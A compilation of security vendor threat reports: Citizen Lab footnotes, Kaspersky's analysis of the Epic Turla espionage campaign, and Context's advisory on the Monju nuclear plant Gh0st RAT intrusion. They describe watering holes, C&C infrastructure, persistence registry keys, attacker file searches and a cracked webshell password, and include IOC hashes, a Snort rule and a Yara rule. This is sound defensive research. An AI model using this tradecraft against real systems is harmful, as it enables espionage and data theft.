8    https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-hardy.pdf
9    https://securelist.com/files/2014/08/KL_report_syrian_malware.pdf
10    https://www.fireeye.com / blog / threat - research/2014/08/connecting - the - dots - syrian - malware - team - uses - blackworm-
for-attacks.html
11    https://citizenlab.org/2014/03/maliciously-repackaged-psiphon/
12
https://www.eff.org / document / quantum - surveillance - familiar - actors - and - possible - false - flags - syrian - malware-
campaigns
13
http://www.birminghammail.co.uk/news/midlands-news/birmingham-hacker-junaid-hussain-syria-7291864
14
http://www.dailymail.co.uk / news / article-2166850/Junaid - Hussain - Team - Poison - hacker-18-published - Tony - Blairs-
address-book-online-faces-jail.html
15
The most recent Citizen Lab report on this topic is Communities @ Risk , which details a four - year long study of targeted
digital threats against ten civil society organizations . https://targetedthreats.net

The Epic Turla Operation
Technical Appendix with IOCs
Executive Summary
Over the last 10 months , Kaspersky Lab researchers have analyzed a massive cyber - espionage operation
which we call " Epic Turla " . The attackers behind Epic Turla have infected several hundred computers in
more than 45 countries , including government institutions , embassies , military , education , research and
pharmaceutical companies .
The attacks are known to have used at least two zero - day exploits :
CVE-2013 - 5065 - Privilege escalation vulnerability in Windows XP and Windows 2003
CVE-2013 - 3346 - Arbitrary code - execution vulnerability in Adobe Reader
We also observed exploits against older ( patched ) vulnerabilities , social engineering techniques and
watering hole strategies in these attacks . The primary backdoor used in the Epic attacks is also known as
" WorldCupSec " , " TadjMakhal " , " Wipbot " or " Tavdig " .
When G - Data published on Turla / Uroburos back in February , several questions remained unanswered .
One big unknown was the infection vector for Turla ( aka Snake or Uroburos ) . Our analysis indicates that
victims are infected via a sophisticated multi - stage attack , which begins with the Epic Turla . In time , as
the attackers gain confidence , this is upgraded to more sophisticated backdoors , such as the
Carbon / Cobra system . Sometimes , both backdoors are run in tandem , and used to " rescue " each other if
communications are lost with one of the backdoors .
Once the attackers obtain the necessary credentials without the victim noticing , they deploy the rootkit
and other extreme persistence mechanisms .
The attacks are still ongoing as of July 2014 , actively targeting users in Europe and the Middle East .
Note : A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services
subscribers . Contact : intelreports@kaspersky.com
The Epic Turla attacks
The attacks in this campaign fall into several different categories depending on the vector used in the
initial compromise :
Spearphishing e - mails with Adobe PDF exploits ( CVE-2013 - 3346 + CVE-2013 - 5065 )
Social engineering to trick the user into running malware installers with " .SCR " extension ,
sometimes packed with RAR
Watering hole attacks using Java exploits ( CVE-2012 - 1723 ) , Flash exploits ( unknown ) or Internet
Explorer 6,7,8 exploits ( unknown )
Watering hole attacks that rely on social engineering to trick the user into running fake " Flash
Player " malware installers
The attackers use both direct spearphishing and watering hole attacks to infect their victims . Watering
holes ( waterholes ) are websites of interest to the victims that have been compromised by the attackers and
injected to serve malicious code .
So far we haven't been able to locate any e - mail used against the victims , only the attachments . The PDF
attachments do not show any " lure " to the victim when opened , however , the SCR packages sometime
show a clean PDF upon successful installation .
Some of known attachment names used in the spearphishing attacks are :
‫(ﺗﻤﺮ ﺟﻨ"ﻒ‬.rar ( translation from Arabic : " Geneva conference.rar " )
NATO position on Syria.scr
Note_№107 - 41D.pdf
Talking Points.scr
border_security_protocol.rar
Security protocol.scr
Program.scr
In some cases , these filenames can provide clues about the type of victims the attackers are targeting .
The watering hole attacks
Currently , the Epic attackers run a vast network of watering holes that target visitors with surgical
precision .
Some of the injected websites include :
The website of the City Hall of Pinor , Spain
A site promoting entrepreneurship in the border area of Romania
Palestinian Authority Ministry of Foreign Affairs
In total , we observed more than 100 injected websites . Currently , the largest number of injected sites is in
Romania .
Here 's a statistic on the injected websites :
The distribution is obviously not random , and it reflects some of the interests of the attackers . For
instance , in Romania many of the infected sites are in the Mures region , while many of the Spanish
infected sites belong to local governments ( City Hall ) .
Most of the infected sites use the TYPO3 CMS ( see : http://typo3.org/ ) , which could indicate the attackers
are abusing a specific vulnerability in this publishing platform .
Injected websites load a remote JavaScript into the victim 's browser :
The script " sitenavigatoin.js " is a Pinlady - style browser and plugin detection script , which in turn ,
redirects to a PHP script sometimes called main.php or wreq.php . Sometimes , the attackers register the
.JPG extension with the PHP handler on the server , using " JPG " files to run PHP scripts :
Profiling script
The main exploitation script " wreq.php " , " main.php " or " main.jpg " performs a numbers of tasks . We have
located several versions of this script which attempt various exploitation mechanisms .
One version of this script attempts to exploit Internet Explorer versions 6 , 7 and 8 :
Internet Explorer exploitation script
Unfortunately , the Internet Explorer exploits have not yet been retrieved .
Another more recent version attempts to exploit Oracle Sun Java and Adobe Flash Player :
Java and Flash Player exploitation scripts
Although the Flash Player exploits could n't be retrieved , we did manage to obtain the Java exploits :
Name                MD5
allj.html           536eca0defc14eff0a38b64c74e03c79
allj.jar            f41077c4734ef27dec41c89223136cf8
allj64.html         15060a4b998d8e288589d31ccd230f86
allj64.jar          e481f5ea90d684e5986e70e6338539b4
lstj.jar            21cbc17b28126b88b954b3b123958b46
lstj.html           acae4a875cd160c015adfdea57bd62c4
The Java files exploit a popular vulnerability , CVE-2012 - 1723 , in various configurations .
The payload dropped by these Java exploits is the following :
MD5 : d7ca9cf72753df7392bfeea834bcf992
The Java exploit use a special loader that attempts to inject the final Epic backdoor payload into
explorer.exe . The backdoor extracted from the Java exploits has the following C&C hardcoded inside :
www.arshinmalalan[.]com/themes/v6/templates/css/in.php
This C&C is still online at the moment although it redirects to a currently suspended page at
" hxxp://busandcoachdirectory.com[.]au " . For a full list of C&C servers , please see the Appendix .
The Epic Turla attackers are extremely dynamic in using exploits or different methods depending on what
is available at the moment . Most recently , we observed them using yet another technique coupled with
watering hole attacks . This takes advantage of social engineering to trick the user into running a fake
Flash Player ( MD5 : 030f5fdb78bfc1ce7b459d3cc2cf1877 ) :
In at least one case , they tried to trick the user into downloading and running a fake Microsoft Security
Essentials app ( MD5 : 89b0f1a3a667e5cd43f5670e12dba411 ) :
The fake application is signed by a valid digital certificate from Sysprint AG :
Serial number : 00 c0 a3 9e 33 ec 8b ea 47 72 de 4b dc b7 49 bb 95 Thumbprint : 24 21 58 64 f1 28 97 2b 26
22 17 2d ee 62 82 46 07 99 ca 46
Valid signature from Sysprint AG on Epic dropper
This file was distributed from the Ministry of Foreign Affairs of Tajikistan 's website , at
" hxxp://mfa[.]tj / upload / security.php " .
The file is a .NET application that contains an encrypted resource . This drops the malicious file with the
MD5 7731d42b043865559258464fe1c98513 .
This is an Epic backdoor which connects to the following C&Cs , with a generic internal ID of 1156fd22-
3443 - 4344-c4ffff :
hxxp://homaxcompany[.]com / components / com_sitemap/
hxxp://www.hadilotfi[.]com / wp - content / themes / profile/
A full list with all the C&C server URLs that we recovered from the samples can be found in the technical
Appendix .
The Epic command - and - control infrastructure
The Epic backdoors are commanded by a huge network of hacked servers that deliver command and
control functionality .
The huge network commanded by the Epic Turla attackers serves multiple purposes . For instance , the
motherships function as both exploitation sites and command and control panels for the malware .
Here 's how the big picture looks like :
Epic Turla lifecycle
The first level of command and control proxies generally talk to a second level of proxies , which in turn ,
talk to the " mothership " server . The mothership server is generally a VPS , which runs the Control panel
software used to interact with the victims . The attackers operate the mothership using a network of
proxies and VPN servers for anonymity reasons . The mothership also work as the exploitation servers
used in the watering hole attacks , delivering Java , IE or fake applications to the victim .
We were able to get a copy of one of the motherships , which provided some insight into the operation .
It runs a control panel which is password protected :
Epic mothership control panel login
Once logged into the Control panel , the attackers can see a general overview of the system including the
number of interesting potential targets :
Epic control panel status overview
A very interesting file on the servers is task.css , where the attackers define the IP ranges they are
interested in . To change the file , they are using the " Task editor " from the menu . Depending on the
" tasks " , they will decide whether to infect the visitors or not . In this case , we found they targeted two
ranges belonging to :
" Country A " - Federal Government Network
" Country B " - Government Telecommunications and Informatics Services Network
It should be noted though , the fact that the attackers were targeting these ranges does n't necessarily mean
they also got infected . Some other unknown IPs were also observed in the targeting schedules .
There is also an " except.css " file where attackers log the reasons they did n't try to exploit certain visitors .
There are three possible values :
TRY
DON'T TRY - > Version of the browser and OS does not meet the conditions
DON'T TRY - > ( 2012 - 09 - 19 10:02:04 ) - checktime < 60
These are the " do n't meet the conditions " reasons observed in the logs :
Windows 7 or 2008 R2
MSIE 8.0
Mozilla/4.0 ( compatible ; MSIE 8.0 ; Windows NT 6.1 ; WOW64 ; Trident/4.0 ; SLCC2 ; .NET CLR
2.0.50727 ; .NET CLR 3.5.30729 ; .NET CLR 3.0.30729 ; .NET CLR 1.1.4322 ; .NET4.0C ; .NET4.0E )
Adobe Shockwave 11.5.1.601
Adobe Flash 10.3.181.14
Adobe Reader 10.1.0.0
Win Media Player 12.0.7601.17514
Quick Time null
MS Word null
Java null
The Epic / Tavdig / Wipbot backdoor
For this first stage of the attack , the threat actor uses a custom backdoor . In some cases , the backdoor is
packaged together with the CVE-2013 - 5065 EoP exploit and heavily obfuscated . This makes the analysis
more difficult .
The CVE-2013 - 5065 exploit allows the backdoor to achieve administrator privileges on the system and run
unrestricted . This exploit only works on unpatched Microsoft Windows XP systems .
Other known detection names for the backdoor is Trojan . Wipbot ( Symantec ) or Tavdig .
The main backdoor is about 60 KB in size and implements a C&C protocol on top of normal HTTP
requests . The communication protocol uses
requests in the C&C replies , which the malware decrypts and processes . The replies are sent back to the
C&C through the same channel .
The malware behavior is defined by a configuration block . The configuration block usually contains two
hard - coded C&C URLs . He have also seen one case where the configuration block contains just one URL .
The configuration can also be updated on the fly by the attackers , via the C&C.
The backdoor attempts to identify the following processes and , if found , it will terminate itself :
tcpdump.exe
windump.exe
ethereal.exe
wireshark.exe
ettercap.exe
snoop.exe
dsniff.exe
It contains an internal unique ID , which is used to identify the victim to the C&C. Most samples , especially
old ones , have the ID 1156fd22 - 3443 - 4344-c4ffff . Once a victim is confirmed as " interesting " , the
attackers upload another Epic backdoor which has a unique ID used to control this specific victim .
During the first C&C call , the backdoor sends a pack with the victim 's system information . All further
information sent to the C&C is encrypted with a public key framework , making decryption impossible . The
commands from the C&C are encrypted in a simpler manner and can be decrypted if intercepted because
the secret key is hardcoded in the malware .
Through monitoring , we were able to capture a large amount of commands sent to the victims by the
attackers , providing an unique view into this operation . Here 's a look at one of the encrypted server
replies :
Once a victim is infected and " checks in " with the server , the attackers send a template of commands :
Next , the attackers try to move through the victim 's network using pre - defined or collected passwords :
Listing all .doc files recursively is also a common " theme " :
In total , we have decoded several hundreds of these command packages delivered to the victims , providing
an unique insight into the inner workings of the attackers .
In addition to generic searches , some very specific lookups have been observed as well . These include
searches for :
* NATO*.msg
eu energy dialogue*. *
EU*.msg
Budapest*.msg
In this case , the attackers were interested to find e - mails related to " NATO " , " Energy Dialogue within
European Unition " and so on .
For some of the C&C servers , the attackers implemented RSA encryption for the C&C logs , which makes it
impossible to decrypt them . This scheme was implemented in April 2014 .
Lateral movement and upgrade to more sophisticated backdoors
Once a victim is compromised , the attackers upload several tools that are used for lateral movement .
One such tool observed in the attacks and saved as " C:\Documents and Settings\All users\Start
Menu\Programs\Startup\winsvclg.exe " is :
Name : winsvclg.exe
MD5 : a3cbf6179d437909eb532b7319b3dafe
Compiled : Tue Oct 02 13:51:50 2012
This is a keylogger tool that creates % temp%\~DFD3O8.tmp . Note : the filename can change across
victims . On one Central Asian government 's Ministry of Foreign Affairs victim system , the filename used
was " adobe32updt.exe " .
In addition to these custom tools , we observed the usage of standard administration utilities . For instance ,
another tool often uploaded by the attackers to the victim 's machine is " winrs.exe " :
Name : winrs.exe
MD5 : 1369fee289fe7798a02cde100a5e91d8
This is an UPX packed binary , which contains the genuine " dnsquery.exe " tool from Microsoft , unpacked
MD5 : c0c03b71684eb0545ef9182f5f9928ca .
In several cases , an interesting update has been observed -- a malware from a different , yet related family .
Size : 275,968 bytes
MD5 : e9580b6b13822090db018c320e80865f
Compiled : Thu Nov 08 11:05:35 2012
another example :
Size : 218,112 bytes
MD5 : 071d3b60ebec2095165b6879e41211f2
Compiled : Thu Nov 08 11:04:39 2012
This backdoor is more sophisticated and belongs to the next level of cyber - espionage tools called the
" Carbon system " or Cobra by the Turla attackers . Several plugins for the " Carbon system " are known to
exist .
Decoded configuration for e9580b6b13822090db018c320e80865f
Note : the command and control servers www.losguayaberos[.]com and
thebesttothbrushes[.]com have been sinkholed by Kaspersky Lab .
Other packages delivered to the victims include :
MD5 : c7617251d523f3bc4189d53df1985ca9
MD5 : 0f76ef2e6572befdc2ca1ca2ab15e5a1
These top level packages deploy both updated Epic backdoors and Turla Carbon system backdoors to
confirmed victims , effectively linking the Epic and Turla Carbon operations together .
The Turla Carbon dropper from these packages has the following properties :
MD5 : cb1b68d9971c2353c2d6a8119c49b51f
This is called internally by the authors " Carbon System " , part of the " Cobra " project , as it can be seen from
the debug path inside :
This acts as a dropper for the following modules , both 32 and 64 bit :
MD5                                                      Resource number
4c1017de62ea4788c7c8058a8f825a2d                         101
43e896ede6fe025ee90f7f27c6d376a4                         102
e6d1dcc6c2601e592f2b03f35b06fa8f                         104
554450c1ecb925693fedbb9e56702646                         105
df230db9bddf200b24d8744ad84d80e8                         161
91a5594343b47462ebd6266a9c40abbe                         162
244505129d96be57134cb00f27d4359c                         164
4ae7e6011b550372d2a73ab3b4d67096                         165
The Carbon system is in essence an extensible platform , very similar to other attack platforms such as the
Tilded platform or the Flame platform . The plugins for the Carbon system can be easily recognized as they
always feature at least two exports named :
ModuleStart
ModuleStop
Carbon system plugin with characteristic exports
Several Epic backdoors appear to have been designed to work as Carbon system plugins as well - they
require a specialized loader to start in victim systems that do not have the Carbon system deployed .
Some modules have artifacts which indicate the Carbon system is already at version 3.x , although the
exact Carbon system version is very rarely seen in samples :
The author of the Carbon module above can be also seen in the code , as " gilg " , which also authored several
other Turla modules .
We are planning to cover the Turla Carbon system with more details in a future report .
Language artifacts
The payload recovered from one of the mothership servers ( at
newsforum.servehttp[.]com/wordpress/wp-includes/css/img/upload.php , MD5 :
4dc22c1695d1f275c3b6e503a1b171f5 , Compiled : Thu Sep 06 14:09:55 2012 ) contains two modules , a
loader / injector and a backdoor . Internally , the backdoor is named " Zagruzchick.dll " :
The word " Zagruzchick " means " boot loader " in Russian .
The Control panel for the Epic motherships also sets the language to codepage " 1251 " :
Codepage 1251 is commonly used to render Cyrillic characters .
There are other indications that the attackers are not native English language speakers :
Password it´s wrong !
Count successful more MAX
File is not exists
File is exists for edit
The sample e9580b6b13822090db018c320e80865f that was delivered to several Epic victims as an
upgraded backdoor , has the compilation code page language set to " LANG_RUSSIAN " .
The threat actor behind the " Epic " operation uses mainly hacked servers to host their proxies . The hacked
servers are controlled through the use of a PHP webshell . This shell is password protected ; the password is
checked against an MD5 hash :
The MD5 " af3e8be26c63c4dd066935629cf9bac8 " has been solved by Kaspersky Lab as the
password " kenpachi " . In February 2014 we observed the Miniduke threat actor using the same backdoor
on their hacked servers , although using a much stronger password .
Once again , it is also interesting to point out the usage of Codepage 1251 in the webshell , which is used to
render Cyrillic characters .
There appears to be several links between Turla and Miniduke , but we will leave that for a future blogpost .
Victim statistics
On some of the C&C servers used in the Epic attacks , we were able to identify detailed victim statistics ,
which were saved for debugging purposes by the attackers .
This is the country distribution for the top 20 affected countries by victim 's IP :
According to the public information available for the victims ' IPs , targets of " Epic " belong to the following
categories :
Government
Ministry of interior ( EU country )
Ministry of trade and commerce ( EU country )
Ministry of foreign / external affairs ( Asian country , EU country )
Intelligence ( Middle East , EU Country )
Embassies
Military ( EU country )
Education
Research ( Middle East )
Pharmaceutical companies
Unknown ( impossible to determine based on IP / existing data )
Summary
When G - Data published their Turla paper , there were few details publicly available on how victims get
infected with this malware campaign . Our analysis indicates this is a sophisticated multi - stage infection ;
which begins with Epic Turla . This is used to gain a foothold and validate the high profile victim . If the
victim is interesting , they get upgraded to the Turla Carbon system .
Most recently , we observed this attack against a Kaspersky Lab user on August 5 , 2014 , indicating the
operation remains fresh and ongoing .
Note : A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services
customers . Contact : intelreports@kaspersky.com
We would like to add the following at the end of the blogpost , right before the detection names :
Further reading
If you 'd like to read more about Turla / Uroburos , here 's a few recommendations :
G - Data 's paper " Uroburos Highly complex espionage software with Russian roots "
BAE Systems analysis of " The Snake campaign "
" Uroburos : the snake rootkit " , technical analysis by deresz and tecamac
" TR-25 Analysis - Turla / Pfinet / Snake/ Uroburos " by CIRCL.LU
Kaspersky products ' detection names for all the malware samples described in this post :
Backdoor . Win32.Turla.an
Backdoor . Win32.Turla.ao
Exploit . JS.CVE-2013 - 2729.a
Exploit . JS.Pdfka.gkx
Exploit . Java . CVE-2012 - 1723.eh
Exploit . Java . CVE-2012 - 1723.ou
Exploit . Java . CVE-2012 - 1723.ov
Exploit . Java . CVE-2012 - 1723.ow
Exploit . Java . CVE-2012 - 4681.at
Exploit . Java . CVE-2012 - 4681.au
Exploit . MSExcel . CVE-2009 - 3129.u
HEUR : Exploit . Java . CVE-2012 - 1723.gen
HEUR : Exploit . Java . CVE-2012 - 4681.gen
HEUR : Exploit . Java . Generic
HEUR : Exploit . Script . Generic
HEUR : Trojan . Script . Generic
HEUR : Trojan . Win32.Epiccosplay.gen
HEUR : Trojan . Win32.Generic
HackTool . Win32.Agent.vhs
HackTool . Win64.Agent.b
Rootkit . Win32.Turla.d
Trojan - Dropper . Win32.Dapato.dwua
Trojan - Dropper . Win32.Demp.rib
Trojan - Dropper . Win32.Injector.jtxs
Trojan - Dropper . Win32.Injector.jtxt
Trojan - Dropper . Win32.Injector.jznj
Trojan - Dropper . Win32.Injector.jznk
Trojan - Dropper . Win32.Injector.khqw
Trojan - Dropper . Win32.Injector.kkkc
Trojan - Dropper . Win32.Turla.b
Trojan - Dropper . Win32.Turla.d
Trojan . HTML.Epiccosplay.a
Trojan . Win32.Agent.iber
Trojan . Win32.Agent.ibgm
Trojan . Win32.Agentb.adzu
Trojan . Win32.Inject.iujx
Trojan . Win32.Nus.g
Trojan . Win32.Nus.h
Technical Appendix with IOCs

TLP : WHITE
Context Threat Intelligence
Threat Advisory
The Monju Incident
Context Ref .    TA10009
Author          Context Threat Intelligence ( CTI )
Date            27/01/2014
Tel             + 44 ( 0 ) 20 7537 7515
Fax             + 44 ( 0 ) 20 7537 1071
Email           threat@contextis.co.uk
© Context Information Security
TLP : WHITE
E
TLP : WHITE
Contents
1 Distribution                                   3
2 Executive Summary                              4
3 The Monju Incident                             5
3.1 Infection Vector                            5
3.2 Malware                                     6
3.2.1 Overview                                6
3.2.2 Detection                               8
4 Appendix A – File Metadata                     9
TLP : WHITE     Page 2 / 11
TLP : WHITE
1 Distribution
Context Information Security distribute Context Threat Intelligence ( CTI ) reporting under
the Traffic Light Protocol ( TLP)[1 ] , a method of classifying a document in order to promote
the distribution of sensitive information between individuals , organisations or
communities in a controlled and trusted way , based on the originator ’s wishes .
The various levels of the TLP are represented by the following colours :
RED - Personal ; for named recipients only
Sources may use TLP : RED when information can not be effectively acted upon by
additional parties , and could lead to impacts on a party 's privacy , reputation , or
operations if misused .
Recipients may not share TLP : RED information with any parties outside of the specific
exchange , meeting , or conversation in which it is originally disclosed . TLP : RED
information will be passed verbally or in person .
AMBER - Limited Distribution
Sources may use TLP : AMBER when information requires support to be effectively acted
upon , but carries risks to privacy , reputation , or operations if shared outside of the
organisations involved .
Recipients may only share TLP : AMBER information with members of their own
organisation who need to know , and only as widely as necessary to act on that
information .
GREEN – Community Wide
Sources may use TLP : GREEN when information is useful for the awareness of all
participating organisations as well as with peers within the broader community or sector .
Recipients may share TLP : GREEN information with peers and partner organisations within
their sector or community , but not via publicly accessible channels such as publication
or posting publicly on the Internet .
- Unlimited Distribution
Sources may use TLP : WHITE when information carries minimal or no foreseeable risk of
misuse , in accordance with applicable rules and procedures for public release .
Subject to standard copyright rules , TLP : WHITE information may be distributed freely ,
without restriction .
1    http://www.oecd.org/dataoecd/25/10/40761118.pdf
TLP : WHITE                                         Page 3 / 11
TLP : WHITE
2 Executive Summary
On 2nd January 2014 a Systems Administrator at the Monju fast breeder reactor facility in
Japan noticed suspicious connections emanating from a machine in the control room ,
coinciding with what was a seemingly routine software update to a free media player .
Among other items , staff training documents and more than 40,000 emails were stored
on the machine and thought to be harvested by the attacker . The Japanese Atomic
Energy Agency is investigating further .
The attack appears to have been the result of the attackers having compromised the
‘ GOM Player’ update server and having it act as a ‘ watering hole’ , meaning that
machines which access the site are delivered malware . Gom Player originates in South
Korea and in some parts of Asia it is a popular alternative to Windows Media Player . It is
unclear whether every machine trying to download an update received this malware or
whether only machines which fitted a certain profile were infected .
Technical analysis of the implant on the compromised machine has shown it to be a
variant of a Trojan which has been in the wild for some years now and continues to be
effective . The ‘ Gh0st RAT’ has been used extensively in attacks linked to the Chinese
state , though it is important to remember that the code is publicly available and can be
modified and used by anyone . The targeting of a Japanese nuclear facility however , is
consistent with Chinese state intelligence requirements . If this is the work of a Chinese
group then we feel the targeting may go much further than the Civil Nuclear sector and
thus be of interest to the wider Energy Sector and industry as a whole .
In order to inform the Energy Sector and beyond about this attack , we have compiled a
technical summary of the attack and have provided a number of Indicators Of
Compromise ( IOCs ) which can be used to aid detection . It is likely that the attackers
would redeploy their implant against other targets , albeit with a delivery mechanism
more tailored to the location of the intended victims .
TLP : WHITE                                            Page 4 / 11
TLP : WHITE
3 The Monju Incident
3.1 Infection Vector
Based on open source reporting , it appears that the intrusion took place via the
compromise of the GOM Player update server ( app.gomlab.com ) , where attackers
may have gained entry via a PHP - based webshell , hidden within an image , present on
the host since October 2011[2 ] .
The observed malicious activity relates to the modification of a file that controls GOM
Player updates , spanning the date range 27th December 2013 to 16th January 2014 ,
during which time these alterations are reported to have only manifested themselves for
visitors on certain IP ranges ; evidence supporting this claim has not yet been made
public . If this was indeed the case , then the nature of this attack is certainly more
targeted than one that would cover the entire userbase of the GOM Player product ,
with victims comprising of the Japanese Government in addition to those at the Monju
nuclear facility .
The modified file redirected the GOM Player update process to another compromised
server ( www.fudousankaitori.jp ( 203.189.101.35 ) ) , where a file containing both the
legitimate update and the malware was deliver to the victim .
Modified
Update URL
app.gomlab.com
GOM Player
Upd ate Requ est
1
GOM Update
2         Download Request
GOM Player and
Malware
Victim                           3                                                         www.fudousankaitori.jp
Malware Command
And Control
Key
Compromised Server
Attacker Infrastructure                                                                  testqweasd.tk
A diagram illustrating the modified flow of the GOM Player update process which led to the compromise
2    http://hummingbird.tistory.com/5187
TLP : WHITE                                                                 Page 5 / 11
TLP : WHITE
3.2 Malware
3.2.1 Overview
Deployed to the system via a compressed bundle containing the official GOM Player
setup binary and a self - extracting RAR archive containing the malicious files , the
malware consists of a number of individual pieces . Upon extraction from the RAR
archive , the installer component ( 0ae82fd94836815a1e8d284ccb75109d ) is
automatically launched alongside the GOM Player update , distracting victims from the
malicious activity taking place .
The installer component is referred to by the author as ‘ miansha ' which , according to an
East Asia Cyber Threat Intelligence Researcher , is likely Miǎnshā ( 免杀 ) , a phrase
commonly used by People ’s Republic of China ( PRC ) hackers to mean ‘ anti Antivirus
detection’ or ‘ Antivirus avoidance’ ; Symantec[3 ] have named the detection for this
code ‘ Backdoor . Miancha’ , where Miǎnchá ( 免查 , likely shorthand for 免杀查 ) similarly
means ‘ Antivirus avoidance’. The installer is responsible for the malware persistence
mechanism , adding entries to the registry in the following locations , depending on
Windows Version :
Miancha Persistence Registry Keys
Windows Vista and later                      HKEY_USERS\.default\Software\Classes\CLSID\{ECD4FC4D-
5213 - 11D0-B792 - 00A0C90312E1}\InProcServer32\@ =
expand:"C:\WINDOWS\temp\install.ocx "
Prior to Windows Vista                       HKEY_USERS\.default\Software\Classes\CLSID\{B12AE898-
D056 - 4378-A844 - 6D393FE37956}\InProcServer32\@ =
expand:"C:\WINDOWS\temp\install.ocx "
The installer will also determine the system architecture ( 32- or 64-bit ) and then
deobfuscate the relevant loader DLL to the path ‘ C:\Windows\temp\install.ocx’ ,
ensuring the malware is launched on system start - up . Oddly , this file is padded with null
bytes , resulting in a 25 megabyte file .
Repackaged Update
GoMPLAYERJPSETUP.EXE ( a9225e059d9dace1b259bceec7f48dae )
Real GOM Player Installer         Self - extracting RAR Archive containing Malware
GOMPLAYERJPSETUP_JP.EXE ( 1ff3b3628e40f0215afacf482ba17782 )           GOMPLAYERBETASETUP_JP.exe ( db79a93448acac8786581858f3edc36a )
Obfuscated Malware Loaders
Malicious Installer
dll.tmp ( d5548e1913950a42a04debcac4222bd2 )
install.exe ( 0ae82fd94836815a1e8d284ccb75109d )
dll64.tmp ( 01f7b465242237bd3d31d39767aa68e0 )
Obfuscated Implant Code
instructions.pdf ( 569071c45f47b7fb7a75f30bc07d5739 )
instructions64.pdf ( 55474f8e26f2b6fc3b5d78ce9a77b0b0 )
The deployment chain of the Miancha Gh0st variant
3    http://www.symantec.com/security_response/writeup.jsp?docid=2014-012407-3922-99
TLP : WHITE                                                                   Page 6 / 11
TLP : WHITE
The main implant code is stored in files named instructions.pdf and instructions64.pdf ;
not PDF documents but instead DLLs obfuscated with a one - byte XOR with 0x14 , similar
to the malware loader DLLs . The loader , referred to by the malware author as 壳 ( shell ) ,
reads and deobfuscates the main implant code which then communicates with the
attacker - controlled server at testqweasd.tk ( 211.43.220.89 ) on TCP port 443 . The main
implant code is referred to as 白加黑 ( ‘ Black on White’ ) , a term used in the PRC hacking
community to denote the act of Antivirus avoidance through the loading of malicious
‘ black’ code via non - malicious or trusted ‘ white ‘ code . This is a practice recently
illustrated through the deployment of the PlugX trojan , utilising DLL load order hijacking
alongside a signed ( trusted ) executable .
Analysis of this malware revealed it to be a variant of the Gh0st RAT , often used by
Chinese actors ( including those who are state - motivated or directly state - sponsored ) .
This specific variant shows similarities to that used during the VOHO campaign[4 ] , where
Gh0st RAT was spread via watering hole attacks utilising vulnerable websites belonging
to financial services and technology companies . Specifically , the initial five bytes of the
communications ( often used to denote a campaign or victim ) are ‘ HTTPS’ , amended
from the original ‘ Gh0st’ ; the same as the traffic produced by the VOHO Gh0st variant .
In addition to delivering system - specific details back to the attacker , Gh0st RAT provides
the capability to deploy additional malware , enabling the harvesting of sensitive data
and enabling the further propagation throughout the infected network .
4    https://blogs.rsa.com/voho-apt-campaign-update/
TLP : WHITE                                             Page 7 / 11
TLP : WHITE
3.2.2 Detection
To enable rapid response , the following Snort signature can be deployed :
alert tcp $ HOME_NET any - > $ EXTERNAL_NET 53,80,443,1080 ( msg:"gh0st RAT ' HTTPS ' variant
( aka Backdoor . Miancha ) " ; flow : established , to_server ; content:"HTTPS " ; depth:5 ; rawbytes ;
classtype : trojan - activity ; sid : xxx ; rev:1 ; )
Additionally , the following Yara signature should identify both encoded payloads and
the active implant in memory :
rule Trojan_W32_Gh0stMiancha_1_0_0
{
strings :
$ 0x = { 57 5b 5a 5a 51 57 40 34 31 67 2e 31 70 34 5c 40 40 44 3b 25 3a 19    1e    5c    7b
67 60 2e 34 31 67 2e 31 70 19 1e 55 77 77 71 64 60 2e 34 3e 3b 3e 19 1e 57 7b 7a    60    71    7a
60 39 40 6d 64 71 2e 34 60 71 6c 60 3b 7c 60 79 78 19 1e 44 66 7b 6c 6d 39 57 7b    7a    7a    71
77 60 7d 7b 7a 2e 34 5f 71 71 64 39 55 78 7d 62 71 19 1e 57 7b 7a 60 71 7a 60 39    78    71    7a
73 60 7c 2e 34 24 19 1e 19 1e }
$ 1 = { 5c e7 99 bd e5 8a a0 e9 bb 91 5c }
$ 1x = { 48 f3 8d a9 f1 9e b4 fd af 85 48 }
$ 2 = " DllCanLoadNow "
$ 2x = { 50 78 78 57 75 7a 58 7b 75 70 5a 7b 63 }
$ 3x = { 5a 61 79 76 71 66 34 7b 72 34 67 61 76 7f 71 6d 67 2e 34 31 70 }
$ 4 = " JXNcc2hlbGxcb3Blblxjb21tYW5k "
$ 4x = { 5e 4c 5a 77 77 26 7c 78 76 53 6c 77 76 27 56 78 76 78 6c 7e 76 26    25 60 4d
43 21 7f }
$ 5 = " SEFSRFdBUkVcREVTQ1JJUFRJT05cU3lzdGVtXENlbnRyYWxQcm9jZXNzb3JcMA== "
$ 5x = { 47 51 52 47 46 52 70 56 41 7f 42 77 46 51 42 40 45 25 5e 5e 41 52    46 5e 40
24 21 77 41 27 78 6e 70 53 42 60 4c 51 5a 78 76 7a 46 6d 4d 43 6c 45 77 79 2d 7e    4e 4c 5a
6e 76 27 5e 77 59 55 29 29 }
$ 6 = " C:\\Users\\why\\ "
$ 6x = { 57 2e 48 41 67 71 66 67 48 63 7c 6d 48 }
$ 7 = " g:\\ykcx\\ "
$ 7x = { 73 2E 48 6D 7F 77 6C 48 }
$ 8 = " ( miansha ) "
$ 8x = { 3C 79 7D 75 7A 67 7C 75 3D }
$ 9 = " server(\xE5\xA3\xB3 ) "
$ 9x = { 7C 2E 48 26 24 25 27 3A 25 25 3A 26 21 48 67 71 66 62 71 66 3C F1    B7 A7 3D
48 46 71 78 71 75 67 71 48 67 71 66 62 71 66 3A 64 70 76 }
$ cfgDecode = { 8a ? ? ? ? 80 c2 7a 80 f2 19 88 ? ? ? ? 41 3b ce 7c ? ? }
condition :
any of them
}
TLP : WHITE                                              Page 8 / 11
TLP : WHITE
4 Appendix A – File Metadata
Gh0stMiancha Installer
MD5                      0ae82fd94836815a1e8d284ccb75109d
SHA1                     bcba2a4d55d860f0bca3b9f80a5deb2dd69f000c
SHA256                   b2f9e2f7c07235a6ea03e90ba591f0a43d38d8ff8ee6583473b6fbb63831619d
Size ( bytes )             13314
Compile Time             2013 - 11 - 22 12:19:48 UTC
In - the - wild Filenames    install.exe
PDB String               g:\ykcx\install(miansha)\Release\install.pdb
Obfuscated TrojanLoader : W32/Gh0stMiancha
MD5                      d5548e1913950a42a04debcac4222bd2
SHA1                     ac48bc2deefd30dad762a23e85409a7eec48b723
SHA256                   3d43f7fab3c8f574e2790c2d97f85fa87f0d53e412c995462e53348b4fc34b74
Size ( bytes )             10299
